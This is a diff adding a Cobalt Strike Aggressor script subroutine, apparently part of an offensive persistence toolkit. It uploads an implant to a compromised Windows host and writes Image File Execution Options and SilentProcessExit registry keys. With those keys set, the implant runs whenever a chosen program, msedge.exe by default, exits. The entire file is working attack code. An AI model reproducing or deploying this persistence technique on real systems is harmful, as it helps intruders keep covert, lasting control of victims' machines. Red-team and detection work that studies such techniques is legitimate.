@@ -1,0 +1,32 @@
+include("/home/kali/AggressorScripts/persistence/utils.sl");
+
+sub ifeo{
+	local('$program $implant_path');
+	
+	$program = iff($2 !is $null, $2, "msedge.exe");
+	if($3 !is $null){
+		$implant_path = $3;
+	}else{
+		$implant_path = ploadMalFile($1);
+	}
+	
+	if($implant_path is $null){
+		berror($1, "Missing implant file! Also can't upload malware file!");
+		
+		return false;
+	}
+
+	#bshell($1, "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\$program\" /v Debugger /t REG_SZ /d \"$implant_path\" /f");
+	
+	bshell($1, "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\$program\" /f");
+	
+	bshell($1, "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\$program\" /v GlobalFlag /t REG_DWORD /d 512 /f");
+	
+	bshell($1, "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\" /f");
+	
+	bshell($1, "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\$program\" /f");
+	
+	bshell($1, "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\$program\" /v ReportingMode /t REG_DWORD /d 1 /f");
+	
+	bshell($1, "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\$program\" /v MonitorProcess /t REG_SZ /d \"$implant_path\" /f");
+}
